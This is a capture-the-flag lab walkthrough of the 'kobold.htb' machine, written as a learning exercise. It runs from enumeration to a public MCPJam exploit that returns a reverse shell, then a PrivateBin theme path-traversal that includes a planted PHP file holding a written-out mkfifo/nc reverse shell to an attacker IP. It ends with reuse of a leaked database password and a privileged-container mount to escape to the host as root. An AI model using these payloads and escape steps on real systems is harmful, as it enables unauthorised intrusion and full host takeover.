#### Info Enum
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
3552/tcp open  http     Golang net/http server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Tue, 24 Mar 2026 03:11:24 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="
```
add kobold.htb to hosts file.

port 3552 is running Arcane 1.13.0 
fuzz the dir of port 80. get nothing but index page.
`└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://kobold.htb -H 'Host:FUZZ.kobold.htb' -t 100 -fw 6 `
fuzz the subdomain
`└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.129.120.205 -H 'Host:FUZZ.kobold.htb' -t 140 -fs 154`
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.120.205
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 140
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 431ms]
bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 210ms]
```
add these 2 to hosts.
```
bin. is PrivateBin 2.0.2   donot find vuln.
mcp MCPJam Version: v1.4.2. with  a vuln     CVE-2026-23520 
```
for mcp dimain, https://github.com/cypher-21/CVE-2026-23520/blob/main/exploit.py
`└─$ python3 exploit.py https://mcp.kobold.htb --lhost 10.10.16.4 --lport 8821  `      
```
[*] Target: https://mcp.kobold.htb/api/mcp/connect
[*] Sending exploit...

[+] Request sent (no response received).
[*] This is expected if the payload is executing.
[*] Check your listener.
```
set a nc listener: `➜  Downloads nc -nvlp 8821   `
```
Listening on 0.0.0.0 8821
Connection received on 10.129.120.205 43148
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```
get user. 
```
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /etc/passwd | grep bash
<ules/@mcpjam/inspector$ cat /etc/passwd | grep bash      
root:x:0:0:root:/root:/bin/bash
ben:x:1001:1001::/home/ben:/bin/bash
alice:x:1002:1002::/home/alice:/bin/bash
```
check the user and group privi
```
id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

-rwxrwx--- 1 root operator 1704 Mar 15 15:08 /privatebin-data/certs/key.pem
-rwxrwx--- 1 root operator 1168 Mar 15 15:08 /privatebin-data/certs/cert.pem
-rw-r----- 1 root operator 132 Feb 16 08:34 /privatebin-data/data/traffic_limiter.php
```
for the cert file: (cannot decode this.)
```
<?php # |e14880e2b0533d0b4677364d92af3ed8c796679b0f9cda2ac5516258b976aa64dc79cee416f505fa5790de9e232b1756612ac1a0f0d0d0ea2b1c4af0da621f4a8e44543775dfa0e10dfae682687b4943968ec0da01bfe487710e446acb3d2736dc43c4d916f214666c6a6a198043b0195c5c1c2733b8c89d8d6becff2bd3ca4e7a100b92a3b2fe0beb71a22f6bc62562e4e62d305e8a81877a58e161527a6c110bbf2d95738ab3c651324c92dcf04fe2e1c29a018740dec0063b6c39a5438780d882654a8d138b910fc762e04781bd7e946066da948c8522424990cb3777a904f1c5562f7832b6f7b090a805db5cd0b70bf3a35b3bd2d8b9258cadcea548187e|
```
After some enum, it is hard to priv ES and lateral move to aother user.
Another finding is privatebin under / ,/privatebin-data folder

```
/privatebin-data
$ cd data
$ ls
12
27
bd
e3
purge_limiter.php
salt.php
traffic_limiter.php
$ echo '<?php phpinfo();?>' > test.php
$ ls
12
27
bd
e3
purge_limiter.php
salt.php
test.php
traffic_limiter.php
```
after some research, it is  for bin. subdomain to store created files from the web page. And a vuln fits for PrivateBin.
`https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82`
Firstly, test the payload,
`ben@kobold:/privatebin-data/data$ echo '<?php info.php;?>' > test.php`
set the framework in develop tool, or using burp suite to change the theme to ../data/test.php
`    bootstrap5 -- > ..%2Fdata%2Ftest `
refresh the page, we can see the info.php, it works.
Then set reverse shell payload.
`ben@kobold:/privatebin-data/data$ echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.4 8000 >/tmp/f");?>' > a.php`
```
..%2Fdata%2Ftest    -->   ../data/a
```
`➜  Downloads nc -nvlp 8000`
```
Listening on 0.0.0.0 8000
Connection received on 10.129.120.205 35243
sh: can't access tty; job control turned off
/var/www $ id
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```
`~ $ ls -la`
```
total 68
drwxr-xr-x    1 root     root          4096 Mar 15 21:23 .
drwxr-xr-x    1 root     root          4096 Mar 15 21:23 ..
-rwxr-xr-x    1 root     root             0 Feb 16 08:24 .dockerenv
```
It obviously inside contrainer, run linpeas.
```
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxr-x---    1 root     www-data     25888 Mar  4 12:49 /srv/cfg/conf.php

[model]
; example of DB configuration for MySQL
; Temporarily disabling while we migrate to new server for loadbalancing
;class = Database
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"    ; table prefix
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```
got a Credential, since port 3552 is not involved. 
use arcane / ComplexP@sswordAdmin1928  for port 3552 login. this is a guess!!
Arcane is used to mange container.
```
as ctr is avalablie in the host , https://hacktricks.wiki/en/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.html
in the management page, we create new container use the same image used by crrent running container. and set folder / of mother machine to /app (or any folder you like), to map / to /app inthe container  and enable privi mode.
```
`privatebin/nginx-fpm-alpine:2.0.2` this is the image used

after create, in the contrainer page,set the config as, view /app folder that is / of target host . lauch a shell on the web page
```
/var/www # cd /app
/app # ls
app              home             opt              snap
bin              lib              privatebin-data  srv
boot             lib64            proc             sys
cdrom            lost+found       root             tmp
dev              media            run              usr
etc              mnt              sbin             var
/app # cd root
/app/root # ls
arcane_linux_amd64  data                root.txt
/app/root # cat root.txt
```

#### lesson learned
- we may meet some rabbithole, so enum all the info we can. subdomain, services, dir... and try all the potential vuln as we can. It may be useful in the later part inthis pentest.
- contrainer escape and mount mother host folder when create container.
